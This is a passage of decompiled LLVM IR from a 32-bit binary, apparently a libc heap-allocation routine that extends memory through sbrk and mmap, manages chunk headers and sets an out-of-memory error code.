  store i32 %v2_805324c, i32* @edx, align 4
  %v2_805324e = sub i32 %v0_8053248, %v2_805324a
  store i32 %v2_805324e, i32* %esi.global-to-local, align 4
  %v2_8053250 = inttoptr i32 %v2_805324c to i32*
  store i32 %v2_805324a, i32* %v2_8053250, align 4
  br label %dec_label_pc_805325e

dec_label_pc_8053256:                             ; preds = %dec_label_pc_805323c
  %v1_8053256 = inttoptr i32 %v8_805322d to i32*
  store i32 0, i32* %v1_8053256, align 4
  br label %dec_label_pc_805325e

dec_label_pc_805325e:                             ; preds = %dec_label_pc_8053243, %dec_label_pc_8053256
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8053243 ], [ @ebx, %dec_label_pc_8053256 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_805325e = or i32 %storemerge, 2
  %v1_8053261 = load i32, i32* @edx, align 4
  %v2_8053261 = add i32 %v1_8053261, 4
  %v3_8053261 = inttoptr i32 %v2_8053261 to i32*
  store i32 %v1_805325e, i32* %v3_8053261, align 4
  %v0_8053264 = load i32, i32* @global_var_8061b90.510, align 16
  %v1_8053269 = add i32 %v0_8053264, 1
  store i32 %v1_8053269, i32* %eax.global-to-local, align 4
  store i32 %v1_8053269, i32* @global_var_8061b90.510, align 16
  %v1_805326f = load i32, i32* @global_var_8061b98.512, align 8
  %v7_8053275 = icmp sgt i32 %v1_8053269, %v1_805326f
  br i1 %v7_8053275, label %dec_label_pc_8053277, label %dec_label_pc_805327c

dec_label_pc_8053277:                             ; preds = %dec_label_pc_805325e
  store i32 %v1_8053269, i32* @global_var_8061b98.512, align 8
  br label %dec_label_pc_805327c

dec_label_pc_805327c:                             ; preds = %dec_label_pc_805325e, %dec_label_pc_8053277
  %v0_805327c = load i32, i32* @global_var_8061ba4.513, align 4
  %v1_8053281 = load i32, i32* @ebx, align 4
  %v2_8053281 = add i32 %v1_8053281, %v0_805327c
  store i32 %v2_8053281, i32* %eax.global-to-local, align 4
  store i32 %v2_8053281, i32* @global_var_8061ba4.513, align 4
  %v1_8053288 = load i32, i32* @global_var_8061bb0.514, align 16
  %tmp130 = icmp ugt i32 %v2_8053281, %v1_8053288
  br i1 %tmp130, label %dec_label_pc_8053290, label %dec_label_pc_8053295

dec_label_pc_8053290:                             ; preds = %dec_label_pc_805327c
  store i32 %v2_8053281, i32* @global_var_8061bb0.514, align 16
  br label %dec_label_pc_8053295

dec_label_pc_8053295:                             ; preds = %dec_label_pc_805327c, %dec_label_pc_8053290
  %v1_8053295 = load i32, i32* @global_var_8061ba8.515, align 8
  %v2_8053295 = add i32 %v1_8053295, %v2_8053281
  store i32 %v2_8053295, i32* %eax.global-to-local, align 4
  %v1_805329b = load i32, i32* @global_var_8061bb4.516, align 4
  %tmp131 = icmp ugt i32 %v2_8053295, %v1_805329b
  br i1 %tmp131, label %dec_label_pc_80532a7, label %dec_label_pc_8052ef8

dec_label_pc_80532a7:                             ; preds = %dec_label_pc_8053295
  store i32 %v2_8053295, i32* @global_var_8061bb4.516, align 4
  br label %dec_label_pc_8052ef8

dec_label_pc_80532b1:                             ; preds = %dec_label_pc_805320c, %dec_label_pc_8053220.dec_label_pc_80532b1_crit_edge, %dec_label_pc_80531fb, %dec_label_pc_80531e4
  %v0_80532b1 = phi i32 [ %v0_80532b1.pre, %dec_label_pc_8053220.dec_label_pc_80532b1_crit_edge ], [ %v0_8053179, %dec_label_pc_80531fb ], [ %v0_8053179, %dec_label_pc_805320c ], [ %v0_8053179, %dec_label_pc_80531e4 ]
  store i32 %v0_80532b1, i32* %eax.global-to-local, align 4
  %v1_80532ba = add i32 %v0_80532b1, 4
  %v2_80532ba = inttoptr i32 %v1_80532ba to i32*
  %v3_80532ba = load i32, i32* %v2_80532ba, align 4
  %v1_80532c4 = and i32 %v3_80532ba, -4
  %v2_80532c4 = icmp eq i32 %v1_80532c4, 0
  store i32 %v1_80532c4, i32* @ebp, align 4
  %v1_80532c7 = load i32, i32* @global_var_8061b88.517, align 8
  %v2_80532c7 = add i32 %v1_80532c7, %v1_8053183
  store i32 %v2_80532c7, i32* %eax.global-to-local, align 4
  %v0_80532cd = load i8, i8* @global_var_8061ba0.518, align 32
  %v1_80532cd = urem i8 %v0_80532cd, 2
  %v2_80532cd = icmp eq i8 %v1_80532cd, 0
  br i1 %v2_80532cd, label %dec_label_pc_80532d8, label %dec_label_pc_80532d6

dec_label_pc_80532d6:                             ; preds = %dec_label_pc_80532b1
  %v2_80532d6 = sub i32 %v2_80532c7, %v1_80532c4
  store i32 %v2_80532d6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80532d8

dec_label_pc_80532d8:                             ; preds = %dec_label_pc_80532b1, %dec_label_pc_80532d6
  %v0_80532dc = phi i32 [ %v2_80532c7, %dec_label_pc_80532b1 ], [ %v2_80532d6, %dec_label_pc_80532d6 ]
  %v5_80532dc = add i32 %v0_80532dc, %v1_80531e4
  store i32 %v5_80532dc, i32* %eax.global-to-local, align 4
  %v1_80532e0 = sub i32 0, %v0_80531b0
  store i32 %v1_80532e0, i32* @edx, align 4
  %v2_80532e8 = and i32 %v5_80532dc, %v1_80532e0
  store i32 %v2_80532e8, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_80532e8, 1
  br i1 %tmp88, label %dec_label_pc_8053302, label %dec_label_pc_80532ec

dec_label_pc_80532ec:                             ; preds = %dec_label_pc_80532d8
  store i32 %v2_80532e8, i32* %stack_var_-92, align 4
  %v1_80532f0 = call i32 @__GI_sbrk(i32 %v2_80532e8)
  store i32 %v1_80532f0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_80532f0, i32* @ebx, align 4
  %v10_80532fd = icmp eq i32 %v1_80532f0, -1
  %v1_8053300 = icmp eq i1 %v10_80532fd, false
  br i1 %v1_8053300, label %dec_label_pc_8053358.dec_label_pc_8053361_crit_edge, label %dec_label_pc_80532ec.dec_label_pc_8053302_crit_edge

dec_label_pc_80532ec.dec_label_pc_8053302_crit_edge: ; preds = %dec_label_pc_80532ec
  %v0_8053302.pre = load i8, i8* @global_var_8061ba0.518, align 32
  br label %dec_label_pc_8053302

dec_label_pc_8053302:                             ; preds = %dec_label_pc_80532ec.dec_label_pc_8053302_crit_edge, %dec_label_pc_80532d8
  %v0_805332e = phi i32 [ -1, %dec_label_pc_80532ec.dec_label_pc_8053302_crit_edge ], [ %v1_80532e0, %dec_label_pc_80532d8 ]
  %v0_8053302 = phi i8 [ %v0_8053302.pre, %dec_label_pc_80532ec.dec_label_pc_8053302_crit_edge ], [ %v0_80532cd, %dec_label_pc_80532d8 ]
  %v1_8053302 = urem i8 %v0_8053302, 2
  %v2_8053302 = icmp eq i8 %v1_8053302, 0
  br i1 %v2_8053302, label %dec_label_pc_8053302.dec_label_pc_8053317_crit_edge, label %dec_label_pc_805330b

dec_label_pc_8053302.dec_label_pc_8053317_crit_edge: ; preds = %dec_label_pc_8053302
  %v0_8053317.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053317

dec_label_pc_805330b:                             ; preds = %dec_label_pc_8053302
  %v2_805330f = add i32 %v1_80532c4, %v1_80531e4
  store i32 %v2_805330f, i32* %eax.global-to-local, align 4
  %v0_8053311 = load i32, i32* @esi, align 4
  %v2_8053311 = add i32 %v0_8053311, %v2_805330f
  %v5_8053313 = and i32 %v2_8053311, %v1_80532e0
  store i32 %v5_8053313, i32* @esi, align 4
  br label %dec_label_pc_8053317

dec_label_pc_8053317:                             ; preds = %dec_label_pc_8053302.dec_label_pc_8053317_crit_edge, %dec_label_pc_805330b
  %v0_8053317 = phi i32 [ %v0_8053317.pre, %dec_label_pc_8053302.dec_label_pc_8053317_crit_edge ], [ %v5_8053313, %dec_label_pc_805330b ]
  %tmp132 = icmp ult i32 %v0_8053317, 1048576
  br i1 %tmp132, label %dec_label_pc_805331f, label %dec_label_pc_8053324

dec_label_pc_805331f:                             ; preds = %dec_label_pc_8053317
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8053324

dec_label_pc_8053324:                             ; preds = %dec_label_pc_8053317, %dec_label_pc_805331f
  %v0_8053338 = phi i32 [ %v0_8053317, %dec_label_pc_8053317 ], [ 1048576, %dec_label_pc_805331f ]
  %tmp133 = icmp ugt i32 %v0_8053338, %v1_805320e
  br i1 %tmp133, label %dec_label_pc_805332e, label %dec_label_pc_8053566

dec_label_pc_805332e:                             ; preds = %dec_label_pc_8053324
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805333b = call i32 @mmap(i32 0, i32 %v0_8053338, i32 3, i32 34, i32 0, i32 0, i32 %v0_805332e, i32 %v0_805332e)
  store i32 %v8_805333b, i32* %eax.global-to-local, align 4
  store i32 %v8_805333b, i32* @ebx, align 4
  %v10_8053345 = icmp eq i32 %v8_805333b, -1
  br i1 %v10_8053345, label %dec_label_pc_8053566, label %dec_label_pc_8053358.thread

dec_label_pc_8053358.thread:                      ; preds = %dec_label_pc_805332e
  %v0_805334e = load i8, i8* @global_var_8061ba0.518, align 1
  %v2_805334e = and i8 %v0_805334e, -2
  store i8 %v2_805334e, i8* @global_var_8061ba0.518, align 32
  %v1_8053355 = load i32, i32* @esi, align 4
  %v2_8053355 = add i32 %v1_8053355, %v8_805333b
  store i32 %v2_8053355, i32* @edx, align 4
  br label %dec_label_pc_8053361

dec_label_pc_8053358.dec_label_pc_8053361_crit_edge: ; preds = %dec_label_pc_80532ec
  %v1_8053365.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053361

dec_label_pc_8053361:                             ; preds = %dec_label_pc_8053358.dec_label_pc_8053361_crit_edge, %dec_label_pc_8053358.thread
  %v1_8053365 = phi i32 [ %v1_8053355, %dec_label_pc_8053358.thread ], [ %v1_8053365.pre, %dec_label_pc_8053358.dec_label_pc_8053361_crit_edge ]
  %v0_805342d92 = phi i32 [ %v8_805333b, %dec_label_pc_8053358.thread ], [ %v1_80532f0, %dec_label_pc_8053358.dec_label_pc_8053361_crit_edge ]
  %v0_805341f91 = phi i32 [ %v2_8053355, %dec_label_pc_8053358.thread ], [ -1, %dec_label_pc_8053358.dec_label_pc_8053361_crit_edge ]
  %v0_8053365 = load i32, i32* @global_var_8061ba8.515, align 8
  %v2_8053365 = add i32 %v1_8053365, %v0_8053365
  store i32 %v2_8053365, i32* @global_var_8061ba8.515, align 8
  %v2_805336b = add i32 %v1_80532c4, %v0_80532b1
  store i32 %v2_805336b, i32* %ecx.global-to-local, align 4
  %v2_805336d = sub i32 %v0_805342d92, %v2_805336b
  %v7_805336d = icmp ult i32 %v0_805342d92, %v2_805336b
  %v12_805336d = icmp eq i32 %v2_805336d, 0
  %v1_805336f = icmp eq i1 %v12_805336d, false
  br i1 %v1_805336f, label %dec_label_pc_8053388, label %dec_label_pc_8053371

dec_label_pc_8053371:                             ; preds = %dec_label_pc_8053361
  %v10_8053371 = icmp eq i32 %v0_805341f91, -1
  %v1_8053374 = icmp eq i1 %v10_8053371, false
  br i1 %v1_8053374, label %dec_label_pc_8053388, label %dec_label_pc_8053376

dec_label_pc_8053376:                             ; preds = %dec_label_pc_8053371
  %v2_8053376 = add i32 %v1_8053365, %v1_80532c4
  store i32 %v0_80532b1, i32* %ecx.global-to-local, align 4
  %v1_805337d = or i32 %v2_8053376, 1
  store i32 %v1_805337d, i32* %eax.global-to-local, align 4
  store i32 %v1_805337d, i32* %v2_80532ba, align 4
  br label %dec_label_pc_80534b5

dec_label_pc_8053388:                             ; preds = %dec_label_pc_8053371, %dec_label_pc_8053361
  %v0_8053388 = load i8, i8* @global_var_8061ba0.518, align 1
  %v1_8053388 = sext i8 %v0_8053388 to i32
  store i32 %v1_8053388, i32* %eax.global-to-local, align 4
  %v2_805338d = urem i8 %v0_8053388, 2
  %v3_805338d = icmp eq i8 %v2_805338d, 0
  br i1 %v3_805338d, label %dec_label_pc_80533a1, label %dec_label_pc_8053391

dec_label_pc_8053391:                             ; preds = %dec_label_pc_8053388
  br i1 %v2_80532c4, label %dec_label_pc_80533a1, label %dec_label_pc_8053395

dec_label_pc_8053395:                             ; preds = %dec_label_pc_8053391
  %v1_8053397 = icmp eq i1 %v7_805336d, false
  br i1 %v1_8053397, label %dec_label_pc_80533a1, label %dec_label_pc_8053399

dec_label_pc_8053399:                             ; preds = %dec_label_pc_8053395
  %v1_8053399 = and i32 %v1_8053388, -2
  %v4_8053399 = trunc i32 %v1_8053399 to i8
  store i32 %v1_8053399, i32* %eax.global-to-local, align 4
  store i8 %v4_8053399, i8* @global_var_8061ba0.518, align 32
  br label %dec_label_pc_80533a1

dec_label_pc_80533a1:                             ; preds = %dec_label_pc_8053395, %dec_label_pc_8053391, %dec_label_pc_8053388, %dec_label_pc_8053399
  %v0_80533a1 = phi i8 [ %v0_8053388, %dec_label_pc_8053395 ], [ %v0_8053388, %dec_label_pc_8053391 ], [ %v0_8053388, %dec_label_pc_8053388 ], [ %v4_8053399, %dec_label_pc_8053399 ]
  %v1_80533a1 = urem i8 %v0_80533a1, 2
  %v2_80533a1 = icmp eq i8 %v1_80533a1, 0
  br i1 %v2_80533a1, label %dec_label_pc_805341f, label %dec_label_pc_80533aa

dec_label_pc_80533aa:                             ; preds = %dec_label_pc_80533a1
  br i1 %v2_80532c4, label %dec_label_pc_80533b8, label %dec_label_pc_80533ae

dec_label_pc_80533ae:                             ; preds = %dec_label_pc_80533aa
  store i32 %v2_805336d, i32* %eax.global-to-local, align 4
  %v2_80533b2 = add i32 %v2_8053365, %v2_805336d
  store i32 %v2_80533b2, i32* @global_var_8061ba8.515, align 8
  br label %dec_label_pc_80533b8

dec_label_pc_80533b8:                             ; preds = %dec_label_pc_80533aa, %dec_label_pc_80533ae
  %v1_80533ba = urem i32 %v0_805342d92, 8
  %v2_80533ba = icmp eq i32 %v1_80533ba, 0
  store i32 %v1_80533ba, i32* %edx.global-to-local, align 4
  %v1_80533bd = icmp eq i1 %v2_80533ba, false
  br i1 %v1_80533bd, label %dec_label_pc_80533c5, label %dec_label_pc_80533bf

dec_label_pc_80533bf:                             ; preds = %dec_label_pc_80533b8
  store i32 %v0_805342d92, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80533cf

dec_label_pc_80533c5:                             ; preds = %dec_label_pc_80533b8
  %v2_80533ca = sub nsw i32 8, %v1_80533ba
  store i32 %v2_80533ca, i32* %eax.global-to-local, align 4
  %v2_80533cc = add i32 %v2_80533ca, %v0_805342d92
  store i32 %v2_80533cc, i32* @edi, align 4
  br label %dec_label_pc_80533cf

dec_label_pc_80533cf:                             ; preds = %dec_label_pc_80533bf, %dec_label_pc_80533c5
  %v0_80533d2 = phi i32 [ 0, %dec_label_pc_80533bf ], [ %v2_80533ca, %dec_label_pc_80533c5 ]
  %v2_80533cf = add i32 %v1_8053365, %v0_805342d92
  %v2_80533d2 = add i32 %v0_80533d2, %v1_80532c4
  store i32 %v2_80533d2, i32* %ecx.global-to-local, align 4
  %v2_80533db = add i32 %v2_80533d2, %v2_80533cf
  store i32 %v2_80533db, i32* %edx.global-to-local, align 4
  %v2_80533e1 = add i32 %v2_80533db, %v1_80531e4
  %v5_80533e4 = and i32 %v2_80533e1, %v1_80532e0
  %v2_80533eb = sub i32 %v5_80533e4, %v2_80533db
  store i32 %v2_80533eb, i32* %eax.global-to-local, align 4
  %v2_80533ed = add i32 %v2_80533eb, %v2_80533d2
  store i32 %v2_80533ed, i32* @esi, align 4
  store i32 %v2_80533ed, i32* %stack_var_-92, align 4
  %v1_80533f1 = call i32 @__GI_sbrk(i32 %v2_80533ed)
  store i32 %v1_80533f1, i32* %eax.global-to-local, align 4
  store i32 %v1_80533f1, i32* @edx, align 4
  %v10_80533fb = icmp eq i32 %v1_80533f1, -1
  %v1_80533fe = icmp eq i1 %v10_80533fb, false
  br i1 %v1_80533fe, label %dec_label_pc_805340e, label %dec_label_pc_8053400

dec_label_pc_8053400:                             ; preds = %dec_label_pc_80533cf
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8053405 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053405, i32* %eax.global-to-local, align 4
  store i32 %v1_8053405, i32* @edx, align 4
  br label %dec_label_pc_8053442

dec_label_pc_805340e:                             ; preds = %dec_label_pc_80533cf
  %v1_805340e = load i32, i32* @ebx, align 4
  %v7_805340e = icmp ult i32 %v1_80533f1, %v1_805340e
  %v1_8053410 = icmp eq i1 %v7_805340e, false
  br i1 %v1_8053410, label %dec_label_pc_8053447, label %dec_label_pc_8053412

dec_label_pc_8053412:                             ; preds = %dec_label_pc_805340e
  %v0_8053412 = load i8, i8* @global_var_8061ba0.518, align 1
  %v2_8053412 = and i8 %v0_8053412, -2
  store i8 %v2_8053412, i8* @global_var_8061ba0.518, align 32
  store i32 %v2_80533cf, i32* @edx, align 4
  br label %dec_label_pc_8053426

dec_label_pc_805341f:                             ; preds = %dec_label_pc_80533a1
  %v10_805341f = icmp eq i32 %v0_805341f91, -1
  br i1 %v10_805341f, label %dec_label_pc_805342a, label %dec_label_pc_8053424

dec_label_pc_8053424:                             ; preds = %dec_label_pc_805341f
  store i32 %v0_805342d92, i32* @edi, align 4
  br label %dec_label_pc_8053426

dec_label_pc_8053426:                             ; preds = %dec_label_pc_8053412, %dec_label_pc_8053424
  %v0_805344749 = phi i32 [ %v2_80533cf, %dec_label_pc_8053412 ], [ %v0_805341f91, %dec_label_pc_8053424 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053447

dec_label_pc_805342a:                             ; preds = %dec_label_pc_805341f
  store i32 %v0_805342d92, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8053431 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053431, i32* @edx, align 4
  %v1_8053438 = load i32, i32* @ebx, align 4
  %v2_8053438 = sub i32 %v1_8053431, %v1_8053438
  %v1_805343a = load i32, i32* @esi, align 4
  %v2_805343a = sub i32 %v2_8053438, %v1_805343a
  store i32 %v2_805343a, i32* %eax.global-to-local, align 4
  %v0_805343c = load i32, i32* @global_var_8061ba8.515, align 8
  %v2_805343c = add i32 %v0_805343c, %v2_805343a
  store i32 %v2_805343c, i32* @global_var_8061ba8.515, align 8
  br label %dec_label_pc_8053442

dec_label_pc_8053442:                             ; preds = %dec_label_pc_8053400, %dec_label_pc_805342a
  %v0_805344748 = phi i32 [ %v1_8053405, %dec_label_pc_8053400 ], [ %v1_8053431, %dec_label_pc_805342a ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053447

dec_label_pc_8053447:                             ; preds = %dec_label_pc_805340e, %dec_label_pc_8053426, %dec_label_pc_8053442
  %v0_805344c = phi i32 [ %v1_80533f1, %dec_label_pc_805340e ], [ %v0_805344749, %dec_label_pc_8053426 ], [ %v0_805344748, %dec_label_pc_8053442 ]
  %v10_8053447 = icmp eq i32 %v0_805344c, -1
  br i1 %v10_8053447, label %dec_label_pc_80534b5, label %dec_label_pc_805344c

dec_label_pc_805344c:                             ; preds = %dec_label_pc_8053447
  %v1_805344c = load i32, i32* @edi, align 4
  %v2_805344c = sub i32 %v0_805344c, %v1_805344c
  store i32 %v2_805344c, i32* @edx, align 4
  store i32 %v1_805344c, i32* @global_var_806186c.503, align 4
  %v1_8053454 = load i32, i32* @esi, align 4
  %v2_8053454 = add i32 %v1_8053454, %v2_805344c
  %v1_8053457 = or i32 %v2_8053454, 1
  store i32 %v1_8053457, i32* %eax.global-to-local, align 4
  %v2_805345a = add i32 %v1_805344c, 4
  %v3_805345a = inttoptr i32 %v2_805345a to i32*
  store i32 %v1_8053457, i32* %v3_805345a, align 4
  %v0_805345d = load i32, i32* @global_var_8061ba8.515, align 8
  %v1_805345d = load i32, i32* @esi, align 4
  %v2_805345d = add i32 %v1_805345d, %v0_805345d
  store i32 %v2_805345d, i32* @global_var_8061ba8.515, align 8
  br i1 %v2_80532c4, label %dec_label_pc_80534b5, label %dec_label_pc_8053467

dec_label_pc_8053467:                             ; preds = %dec_label_pc_805344c
  %v1_8053467 = add i32 %v1_80532c4, -12
  store i32 %v0_80532b1, i32* %ecx.global-to-local, align 4
  %v1_805346e = and i32 %v1_8053467, -8
  store i32 %v1_805346e, i32* %eax.global-to-local, align 4
  %v1_8053473 = or i32 %v1_805346e, 1
  store i32 %v1_8053473, i32* @edx, align 4
  %v5_8053476 = icmp ult i32 %v1_805346e, 15
  store i32 %v1_8053473, i32* %v2_80532ba, align 4
  %v0_805347c = load i32, i32* %ecx.global-to-local, align 4
  %v1_805347c = load i32, i32* %eax.global-to-local, align 4
  %v2_805347c = add i32 %v0_805347c, 4
  %v3_805347c = add i32 %v2_805347c, %v1_805347c
  %v4_805347c = inttoptr i32 %v3_805347c to i32*
  store i32 5, i32* %v4_805347c, align 4
  %v0_8053484 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053484 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053484 = add i32 %v0_8053484, 8
  %v3_8053484 = add i32 %v2_8053484, %v1_8053484
  %v4_8053484 = inttoptr i32 %v3_8053484 to i32*
  store i32 5, i32* %v4_8053484, align 4
  br i1 %v5_8053476, label %dec_label_pc_80534b5, label %dec_label_pc_805348e

dec_label_pc_805348e:                             ; preds = %dec_label_pc_8053467
  %v0_8053491 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053493 = add i32 %v0_8053491, 8
  store i32 %v1_8053493, i32* %eax.global-to-local, align 4
  %v0_8053496 = load i32, i32* @global_var_8061b84.519, align 4
  store i32 %v0_8053496, i32* @ebx, align 4
  store i32 %v1_8053493, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8061b84.519, align 4
  %v1_80534a7 = call i32 @free(i32 %v1_8053493)
  store i32 %v1_80534a7, i32* %eax.global-to-local, align 4
  %v0_80534ac = load i32, i32* @ebx, align 4
  store i32 %v0_80534ac, i32* @global_var_8061b84.519, align 4
  br label %dec_label_pc_80534b5

dec_label_pc_80534b5:                             ; preds = %dec_label_pc_8053467, %dec_label_pc_805344c, %dec_label_pc_8053447, %dec_label_pc_8053376, %dec_label_pc_805348e
  %v0_80534b5 = load i32, i32* @global_var_8061ba8.515, align 8
  store i32 %v0_80534b5, i32* %eax.global-to-local, align 4
  %v1_80534ba = load i32, i32* @global_var_8061bac.520, align 4
  %tmp134 = icmp ugt i32 %v0_80534b5, %v1_80534ba
  br i1 %tmp134, label %dec_label_pc_80534c2, label %dec_label_pc_80534c7

dec_label_pc_80534c2:                             ; preds = %dec_label_pc_80534b5
  store i32 %v0_80534b5, i32* @global_var_8061bac.520, align 4
  br label %dec_label_pc_80534c7

dec_label_pc_80534c7:                             ; preds = %dec_label_pc_80534b5, %dec_label_pc_80534c2
  %v1_80534c7 = load i32, i32* @global_var_8061ba4.513, align 4
  %v2_80534c7 = add i32 %v1_80534c7, %v0_80534b5
  store i32 %v2_80534c7, i32* %eax.global-to-local, align 4
  %v1_80534cd = load i32, i32* @global_var_8061bb4.516, align 4
  %tmp135 = icmp ugt i32 %v2_80534c7, %v1_80534cd
  br i1 %tmp135, label %dec_label_pc_80534d5, label %dec_label_pc_80534da

dec_label_pc_80534d5:                             ; preds = %dec_label_pc_80534c7
  store i32 %v2_80534c7, i32* @global_var_8061bb4.516, align 4
  br label %dec_label_pc_80534da

dec_label_pc_80534da:                             ; preds = %dec_label_pc_80534c7, %dec_label_pc_80534d5
  %v0_80534da = load i32, i32* @global_var_806186c.503, align 4
  store i32 %v0_80534da, i32* @ebx, align 4
  %v1_80534e0 = add i32 %v0_80534da, 4
  %v2_80534e0 = inttoptr i32 %v1_80534e0 to i32*
  %v3_80534e0 = load i32, i32* %v2_80534e0, align 4
  %v1_80534e3 = and i32 %v3_80534e0, -4
  store i32 %v1_80534e3, i32* @ecx, align 4
  %v10_80534e6 = icmp ult i32 %v1_80534e3, %v1_8053183
  br i1 %v10_80534e6, label %dec_label_pc_8053566, label %dec_label_pc_80534ec

dec_label_pc_80534ec:                             ; preds = %dec_label_pc_80534da
  store i32 %v1_805320e, i32* %esi.global-to-local, align 4
  %v2_80534f2 = sub i32 %v1_80534e3, %v1_805320e
  store i32 %v2_80534f2, i32* %ecx.global-to-local, align 4
  %v2_80534f4 = add i32 %v0_80534da, %v1_805320e
  store i32 %v2_80534f4, i32* @edx, align 4
  %v1_80534f7 = or i32 %v1_805320e, 1
  store i32 %v1_80534f7, i32* %eax.global-to-local, align 4
  store i32 %v2_80534f4, i32* @global_var_806186c.503, align 4
  store i32 %v1_80534f7, i32* %v2_80534e0, align 4
  %v0_8053503.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053503

dec_label_pc_8053503:                             ; preds = %dec_label_pc_8053194, %dec_label_pc_80534ec
  %v0_8053503 = phi i32 [ %v5_80531a7, %dec_label_pc_8053194 ], [ %v0_8053503.pre, %dec_label_pc_80534ec ]
  %v1_8053503 = or i32 %v0_8053503, 1
  store i32 %v1_8053503, i32* @ecx, align 4
  %v0_8053506 = load i32, i32* @ebx, align 4
  %v1_8053506 = add i32 %v0_8053506, 8
  store i32 %v1_8053506, i32* %ebx.global-to-local, align 4
  %v1_8053509 = load i32, i32* @edx, align 4
  %v2_8053509 = add i32 %v1_8053509, 4
  %v3_8053509 = inttoptr i32 %v2_8053509 to i32*
  store i32 %v1_8053503, i32* %v3_8053509, align 4
  br label %dec_label_pc_8053573

dec_label_pc_805350e:                             ; preds = %dec_label_pc_8052f4e
  %v5_8053514 = sub i32 %v1_8052f31, %v1_805320e
  store i32 %v5_8053514, i32* %eax.global-to-local, align 4
  %v2_8053518 = add i32 %v0_8052ffc111, %v1_805320e
  store i32 %v2_8053518, i32* @edx, align 4
  %v1_805351c = or i32 %v1_805320e, 1
  store i32 %v2_8053518, i32* @global_var_8061870.504, align 16
  store i32 %v1_805351c, i32* %v2_8052f2b, align 4
  %v0_8053528 = load i32, i32* %eax.global-to-local, align 4
  %v0_805352a = load i32, i32* @edx, align 4
  store i32 %v0_805352a, i32* @global_var_806187c.521, align 4
  %v1_8053530 = or i32 %v0_8053528, 1
  store i32 %v1_8053530, i32* @ecx, align 4
  store i32 %v0_805352a, i32* @global_var_8061880.506, align 128
  %v1_8053539 = add i32 %v0_805352a, 8
  %v2_8053539 = inttoptr i32 %v1_8053539 to i32*
  store i32 ptrtoint (i32* @global_var_8061874.505 to i32), i32* %v2_8053539, align 4
  %v0_8053540 = load i32, i32* @edx, align 4
  %v1_8053540 = add i32 %v0_8053540, 12
  %v2_8053540 = inttoptr i32 %v1_8053540 to i32*
  store i32 ptrtoint (i32* @global_var_8061874.505 to i32), i32* %v2_8053540, align 4
  %v0_8053547 = load i32, i32* @ecx, align 4
  %v1_8053547 = load i32, i32* @edx, align 4
  %v2_8053547 = add i32 %v1_8053547, 4
  %v3_8053547 = inttoptr i32 %v2_8053547 to i32*
  store i32 %v0_8053547, i32* %v3_8053547, align 4
  %v0_805354a = load i32, i32* %eax.global-to-local, align 4
  %v1_805354a = load i32, i32* @edx, align 4
  %v3_805354a = add i32 %v1_805354a, %v0_805354a
  %v4_805354a = inttoptr i32 %v3_805354a to i32*
  store i32 %v0_805354a, i32* %v4_805354a, align 4
  br label %dec_label_pc_8053558

dec_label_pc_805354f:                             ; preds = %dec_label_pc_8052f5d
  store i32 %v1_805320e, i32* %ebx.global-to-local, align 4
  %v0_8053553 = load i32, i32* @ebp, align 4
  %v2_8053553 = or i32 %v1_805320e, 4
  %v3_8053553 = add i32 %v0_8053553, %v2_8053553
  %v4_8053553 = inttoptr i32 %v3_8053553 to i32*
  %v5_8053553 = load i32, i32* %v4_8053553, align 4
  %v6_8053553 = or i32 %v5_8053553, 1
  store i32 %v6_8053553, i32* %v4_8053553, align 4
  br label %dec_label_pc_8053558

dec_label_pc_8053558:                             ; preds = %dec_label_pc_805350e, %dec_label_pc_805354f
  %v0_8053558 = load i32, i32* @ebp, align 4
  %v1_8053558 = add i32 %v0_8053558, 8
  store i32 %v1_8053558, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053573

dec_label_pc_805355d:                             ; preds = %dec_label_pc_805304d
  %v1_805355d = load i32, i32* @ebx, align 4
  %v2_805355d = add i32 %v0_805305c, 4
  %v3_805355d = add i32 %v2_805355d, %v1_805355d
  %v4_805355d = inttoptr i32 %v3_805355d to i32*
  %v5_805355d = load i32, i32* %v4_805355d, align 4
  %v6_805355d = or i32 %v5_805355d, 1
  store i32 %v6_805355d, i32* %v4_805355d, align 4
  br label %dec_label_pc_8053562

dec_label_pc_8053562:                             ; preds = %dec_label_pc_8053065, %dec_label_pc_805355d
  %v0_8053562 = load i32, i32* @ecx, align 4
  store i32 %v0_8053562, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053573

dec_label_pc_8053566:                             ; preds = %dec_label_pc_8053324, %dec_label_pc_80534da, %dec_label_pc_805332e
  %v0_8053566 = load i32, i32* %stack_var_-92, align 4
  %v1_8053566 = call i32 @__errno_location(i32 %v0_8053566)
  store i32 %v1_8053566, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805356d = inttoptr i32 %v1_8053566 to i32*
  store i32 12, i32* %v1_805356d, align 4
  br label %dec_label_pc_8053573

dec_label_pc_8053573:                             ; preds = %dec_label_pc_8053562, %dec_label_pc_8053558, %dec_label_pc_8053503, %dec_label_pc_80531bf, %dec_label_pc_8053171, %dec_label_pc_8052ef8, %dec_label_pc_8053566
  store i32 %v2_8052e2f, i32* @eax, align 4
  store i32 %v2_8052e2f, i32* %stack_var_-92, align 4
  %v2_805357c = call i32 @__pthread_return_void(i32 %v2_8052e2f, i32 1)
  store i32 %v2_805357c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053584

